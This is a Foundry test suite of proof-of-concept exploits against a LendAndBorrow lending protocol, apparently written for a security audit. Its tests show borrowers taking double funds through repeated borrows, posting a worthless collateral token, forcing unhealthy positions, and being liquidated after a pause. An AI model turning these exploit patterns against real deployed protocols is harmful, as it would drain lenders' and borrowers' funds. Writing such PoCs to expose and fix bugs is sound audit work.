// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "src/LendAndBorrow.sol";
import "src/Oracle.sol";
import "src/interfaces/ILendAndBorrow.sol";
import "../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {}

    function mint(address receiver_, uint256 amount_) public {
        _mint(receiver_, amount_);
    }
}

contract ExploitPoc is Test {

    Oracle oracle;
    LendAndBorrow protocol;
    MockERC20 lendingToken;
    MockERC20 collateralToken;
    MockERC20 wrongCollateralToken;
    address owner = vm.addr(1);
    address borrower = address(2);
    address lender = address(3);
    address liquidator = address(4);

    function setUp() public {
        vm.startPrank(owner);
        lendingToken = new MockERC20("Lending Token", "LTKN");
        collateralToken = new MockERC20("Collateral Token", "CLTKN");
        wrongCollateralToken = new MockERC20("Wrong Collateral Token", "WCTK");
        oracle = new Oracle();
        protocol = new LendAndBorrow(address(lendingToken), address(oracle));

        lendingToken.mint(lender, 1000 ether);
        collateralToken.mint(borrower, 500 ether);
        wrongCollateralToken.mint(borrower, 500 ether);
        lendingToken.mint(liquidator, 1000 ether);

        vm.stopPrank();
    }

    function testPOC_LenderLoosesFundsIfCreateMoreThan1Lend() public {
        // Setup pool parameters
        ILendAndBorrow.Pool memory pool = ILendAndBorrow.Pool({
            minLend: 10 ether,
            maxLend: 1000 ether,
            maxTotalLendingAmount: 1000 ether,
            totalLend: 0,
            totalBorrow: 0,
            collateralToken: address(collateralToken),
            collateralizationRatio: 150, // 150% collateralization
            isActive: true
        });

        // Create pool
        vm.prank(owner);
        protocol.createPool(pool);
        vm.stopPrank();

        // Lender lends tokens for the first time
        vm.startPrank(lender);
        uint256 lendingAmount = 200 ether;
        uint256 poolId = 0;
        IERC20(lendingToken).approve(address(protocol), lendingAmount);
        protocol.lend(lendingAmount, poolId);
        uint256 lendingAmountRecorded = protocol.lendings(lender);
        assert(lendingAmountRecorded == lendingAmount);

        // Lender lends tokens for the second time
        IERC20(lendingToken).approve(address(protocol), lendingAmount);
        protocol.lend(lendingAmount, poolId);
        uint256 lendingAmountRecorded2 = protocol.lendings(lender);
        assert(lendingAmountRecorded2 == lendingAmountRecorded); // Total amount is the same as first borrow 
        assert(lendingAmountRecorded2 != lendingAmountRecorded * 2); // Total amount should be double amount from first borrow but it is not
        vm.stopPrank();
    }


    function testPOC_BorrowerCanStealFundsByExecutingDifferentBorrows() public {
        // Setup pool parameters
        ILendAndBorrow.Pool memory pool = ILendAndBorrow.Pool({
            minLend: 10 ether,
            maxLend: 1000 ether,
            maxTotalLendingAmount: 1000 ether,
            totalLend: 0,
            totalBorrow: 0,
            collateralToken: address(collateralToken),
            collateralizationRatio: 150, // 150% collateralization
            isActive: true
        });

        // Create pool
        vm.prank(owner);
        protocol.createPool(pool);
        vm.stopPrank();

        // Lender lends token
        vm.startPrank(lender);
        uint256 lendingAmount = 200 ether;
        uint256 poolId = 0;
        IERC20(lendingToken).approve(address(protocol), lendingAmount);
        protocol.lend(lendingAmount, poolId);
        vm.stopPrank();

        // Borrower borrows tokens
        vm.startPrank(borrower);
        uint256 borrowAmount = 1 ether;
        uint256 neededCollataral = protocol.getNeededCollateralAmount(1 ether, poolId);

        IERC20(collateralToken).approve(address(protocol), neededCollataral);
        uint256 balanceBeforeFirstBorrow = IERC20(lendingToken).balanceOf(borrower);
        protocol.borrow(poolId, borrowAmount, neededCollataral, address(collateralToken));
        uint256 balanceAfterFirstBorrow = IERC20(lendingToken).balanceOf(borrower);

        assert(balanceAfterFirstBorrow == balanceBeforeFirstBorrow + borrowAmount);

        // Execute second exact same borrow
        IERC20(collateralToken).approve(address(protocol), neededCollataral);
        protocol.borrow(poolId, borrowAmount, neededCollataral, address(collateralToken));
        uint256 balanceAfterSecondBorrow = IERC20(lendingToken).balanceOf(borrower);
        uint256 attackerBorrows = protocol.borrows(borrower);

        assert(attackerBorrows == borrowAmount); // Borrow object has not accounted the sum of the 2 borrows
        assert(balanceAfterSecondBorrow == balanceAfterFirstBorrow * 2); // Attacker got double amount of funds 
        vm.stopPrank();
    }

    function testPOC_borrowCanStealFundsByDepositingWrongCollateral() public {
        // Setup pool parameters
        ILendAndBorrow.Pool memory pool = ILendAndBorrow.Pool({
            minLend: 10 ether,
            maxLend: 1000 ether,
            maxTotalLendingAmount: 1000 ether,
            totalLend: 0,
            totalBorrow: 0,
            collateralToken: address(collateralToken),
            collateralizationRatio: 150, // 150% collateralization
            isActive: true
        });

        // Create pool
        vm.prank(owner);
        protocol.createPool(pool);
        vm.stopPrank();

        // Lender lends token
        vm.startPrank(lender);
        uint256 lendingAmount = 200 ether;
        uint256 poolId = 0;
        IERC20(lendingToken).approve(address(protocol), lendingAmount);
        protocol.lend(lendingAmount, poolId);
        vm.stopPrank();

        // Borrower borrows tokens
        vm.startPrank(borrower);
        uint256 borrowAmount = 1 ether;
        uint256 neededCollataral = protocol.getNeededCollateralAmount(1 ether, poolId);

        IERC20(wrongCollateralToken).approve(address(protocol), neededCollataral);
        uint256 balanceBeforeFirstBorrow = IERC20(lendingToken).balanceOf(borrower);
        protocol.borrow(poolId, borrowAmount, neededCollataral, address(wrongCollateralToken)); // User deposit the wrong collateral token
        uint256 balanceAfterFirstBorrow = IERC20(lendingToken).balanceOf(borrower); // He should have deposited the collateral token associated to this specific pool
                                                                                    // However he could deposit a collateral worth much less.
        assert(balanceAfterFirstBorrow == balanceBeforeFirstBorrow + borrowAmount);
        vm.stopPrank();
    }

    function testPOC_BorrowerCanModifyPositionToUnhealthyState() public {
        // Setup pool parameters
        ILendAndBorrow.Pool memory pool = ILendAndBorrow.Pool({
            minLend: 10 ether,
            maxLend: 1000 ether,
            maxTotalLendingAmount: 1000 ether,
            totalLend: 0,
            totalBorrow: 0,
            collateralToken: address(collateralToken),
            collateralizationRatio: 150, // 150% collateralization
            isActive: true
        });

        // Create pool
        vm.prank(owner);
        protocol.createPool(pool);
        vm.stopPrank();

        // Lender lends token
        vm.startPrank(lender);
        uint256 lendingAmount = 200 ether;
        uint256 poolId = 0;
        IERC20(lendingToken).approve(address(protocol), lendingAmount);
        protocol.lend(lendingAmount, poolId);
        vm.stopPrank();

        // Borrower borrows tokens
        vm.startPrank(borrower);
        uint256 borrowAmount = 1 ether;
        uint256 neededCollataral = protocol.getNeededCollateralAmount(1 ether, poolId);

        IERC20(collateralToken).approve(address(protocol), neededCollataral);
        uint256 balanceBeforeFirstBorrow = IERC20(lendingToken).balanceOf(borrower);
        protocol.borrow(poolId, borrowAmount, neededCollataral, address(collateralToken));
        uint256 balanceAfterFirstBorrow = IERC20(lendingToken).balanceOf(borrower);
        assert(balanceAfterFirstBorrow == balanceBeforeFirstBorrow + borrowAmount);

        uint256 collateralNeededAmount = protocol.getNeededCollateralAmount(borrowAmount, poolId);
        uint256 collateralAmountDeposited = protocol.collateralAmountInPool(borrower, poolId);
        assert(collateralAmountDeposited >= collateralNeededAmount); // Check that current position is healthy

        // Borrower modifies his existing position
        uint256 amountToRemove = neededCollataral / 2; // Removes half of the deposited collateral
        protocol.modifyExistingPosition(poolId, amountToRemove, false);
        vm.stopPrank();

        // Liquidator liquidates the modified position
        vm.startPrank(liquidator);
        protocol.liquidate(borrower, poolId);
        uint256 updatedBorrow = protocol.borrows(borrower);
        assert(updatedBorrow == 0); // Borrower gets instantly liquidated
        vm.stopPrank();
    }

    function testPOC_InterestAccumulatingWhileProtocolPaused() public {
        // Setup pool parameters
        ILendAndBorrow.Pool memory pool = ILendAndBorrow.Pool({
            minLend: 10 ether,
            maxLend: 1000 ether,
            maxTotalLendingAmount: 1000 ether,
            totalLend: 0,
            totalBorrow: 0,
            collateralToken: address(collateralToken),
            collateralizationRatio: 150, // 150% collateralization
            isActive: true
        });

        // Create pool
        vm.prank(owner);
        protocol.createPool(pool);
        vm.stopPrank();

        // Lender lends token
        vm.startPrank(lender);
        uint256 lendingAmount = 200 ether;
        uint256 poolId = 0;
        IERC20(lendingToken).approve(address(protocol), lendingAmount);
        protocol.lend(lendingAmount, poolId);
        vm.stopPrank();

        // Borrower borrows tokens
        vm.startPrank(borrower);
        uint256 borrowAmount = 1 ether;
        uint256 neededCollataral = protocol.getNeededCollateralAmount(1 ether, poolId);

        IERC20(collateralToken).approve(address(protocol), neededCollataral);
        uint256 balanceBeforeFirstBorrow = IERC20(lendingToken).balanceOf(borrower);
        protocol.borrow(poolId, borrowAmount, neededCollataral, address(collateralToken));
        uint256 balanceAfterFirstBorrow = IERC20(lendingToken).balanceOf(borrower);

        assert(balanceAfterFirstBorrow == balanceBeforeFirstBorrow + borrowAmount);
        vm.stopPrank();

        uint256 accruedFeeWhenDepositing = protocol.getAccruedFee(borrower);

        // Owner pauses protocol
        vm.startPrank(owner);
        protocol.pause();
        vm.stopPrank();

        // Fees keep accumulating
        uint256 elapsedTime = 1 weeks;
        vm.warp(block.timestamp+ elapsedTime);
        uint256 accruedFeeAfterCertainTime = protocol.getAccruedFee(borrower);
        assert(accruedFeeAfterCertainTime > accruedFeeWhenDepositing);

        // Borrower can not repay debt
        vm.startPrank(borrower);
        uint256 repayAmount = 0.5 ether;
        IERC20(lendingToken).approve(address(protocol), repayAmount);
        vm.expectRevert();
        protocol.repay(repayAmount, poolId);
        vm.stopPrank();      
    }

    function testPOC_BorrowerCanInstantlyGetLiquidatedAfterUnpause() public {
        // Setup pool parameters
        ILendAndBorrow.Pool memory pool = ILendAndBorrow.Pool({
            minLend: 10 ether,
            maxLend: 1000 ether,
            maxTotalLendingAmount: 1000 ether,
            totalLend: 0,
            totalBorrow: 0,
            collateralToken: address(collateralToken),
            collateralizationRatio: 150, // 150% collateralization
            isActive: true
        });

        // Create pool
        vm.prank(owner);
        protocol.createPool(pool);
        vm.stopPrank();

        // Lender lends token
        vm.startPrank(lender);
        uint256 lendingAmount = 200 ether;
        uint256 poolId = 0;
        IERC20(lendingToken).approve(address(protocol), lendingAmount);
        protocol.lend(lendingAmount, poolId);
        vm.stopPrank();

        // Borrower borrows tokens
        vm.startPrank(borrower);
        uint256 borrowAmount = 1 ether;
        uint256 neededCollataral = protocol.getNeededCollateralAmount(1 ether, poolId);

        IERC20(collateralToken).approve(address(protocol), neededCollataral);
        uint256 balanceBeforeFirstBorrow = IERC20(lendingToken).balanceOf(borrower);
        protocol.borrow(poolId, borrowAmount, neededCollataral, address(collateralToken));
        uint256 balanceAfterFirstBorrow = IERC20(lendingToken).balanceOf(borrower);

        assert(balanceAfterFirstBorrow == balanceBeforeFirstBorrow + borrowAmount);
        vm.stopPrank();

        uint256 accruedFeeWhenDepositing = protocol.getAccruedFee(borrower);

        // Owner pauses protocol
        vm.startPrank(owner);
        protocol.pause();
        vm.stopPrank();

        // Fees keep accumulating
        uint256 elapsedTime = 1 weeks;
        vm.warp(block.timestamp+ elapsedTime);
        uint256 accruedFeeAfterCertainTime = protocol.getAccruedFee(borrower);
        assert(accruedFeeAfterCertainTime > accruedFeeWhenDepositing);

        // Borrower can not repay debt
        vm.startPrank(borrower);
        uint256 repayAmount = 0.5 ether;
        IERC20(lendingToken).approve(address(protocol), repayAmount);
        vm.expectRevert();
        protocol.repay(repayAmount, poolId);
        vm.stopPrank(); 

        // Owner unpauses protocol
        vm.startPrank(owner);
        protocol.unPause();
        vm.stopPrank();

        // Liquidator liquidates borrower
        vm.startPrank(liquidator);
        protocol.liquidate(borrower, poolId);
        uint256 updatedBorrow = protocol.borrows(borrower);
        assert(updatedBorrow == 0); // Borrower gets instantly liquidated without grace period and the possibility of repaying his debt
        vm.stopPrank();
    }
}

